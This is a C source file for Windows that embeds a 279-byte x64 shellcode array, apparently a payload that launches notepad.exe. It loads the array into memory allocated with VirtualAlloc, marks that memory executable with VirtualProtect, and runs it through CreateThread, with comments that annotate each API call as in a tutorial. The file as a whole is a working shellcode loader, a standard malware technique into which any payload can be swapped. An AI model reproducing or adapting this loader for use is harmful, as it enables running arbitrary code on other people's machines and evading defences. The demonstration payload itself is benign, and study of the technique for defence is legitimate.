#include <windows.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
    //MessageBox(NULL,NULL,NULL, MB_ICONEXCLAMATION | MB_OK);
    //notepad.exe
    unsigned char shellcode_payload[279] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65,
        0x78, 0x65, 0x00
    };
    unsigned int shellcode_length=279;

    // allocate virtual memory 
    LPVOID memory_address = VirtualAlloc(NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);   //LPVOID is long pointer to void
    //[in, optional] LPVOID lpAddress,
    //[in]           SIZE_T dwSize,
    //[in]           DWORD  flAllocationType,
    //[in]           DWORD  flProtect


    //load shellcode into memoy
    RtlMoveMemory(memory_address,shellcode_payload,shellcode_length);
    //_Out_       VOID UNALIGNED *Destination,
    //_In_  const VOID UNALIGNED *Source,
    //_In_        SIZE_T         Length


    //make shellcode executable
    DWORD old_protection=0;
    BOOL returned_vp= VirtualProtect(memory_address,shellcode_length,PAGE_EXECUTE_READWRITE, &old_protection);
    //[in]  LPVOID lpAddress,
    //[in]  SIZE_T dwSize,
    //[in]  DWORD  flNewProtect,
    //[out] PDWORD lpflOldProtect

    if(returned_vp != 0)
    {
        //make a thread
        HANDLE thread_handel = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) memory_address, NULL , 0, NULL);
        //[in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
        //[in]            SIZE_T                  dwStackSize,
        //[in]            LPTHREAD_START_ROUTINE  lpStartAddress,
        //[in, optional]  __drv_aliasesMem LPVOID lpParameter,
        //[in]            DWORD                   dwCreationFlags,
        //[out, optional] LPDWORD                 lpThreadId


        //wait for thread to complete
        WaitForSingleObject(thread_handel,INFINITE);
        //[in] HANDLE hHandle,
        //[in] DWORD  dwMilliseconds
    
    } 

 return(0);
}
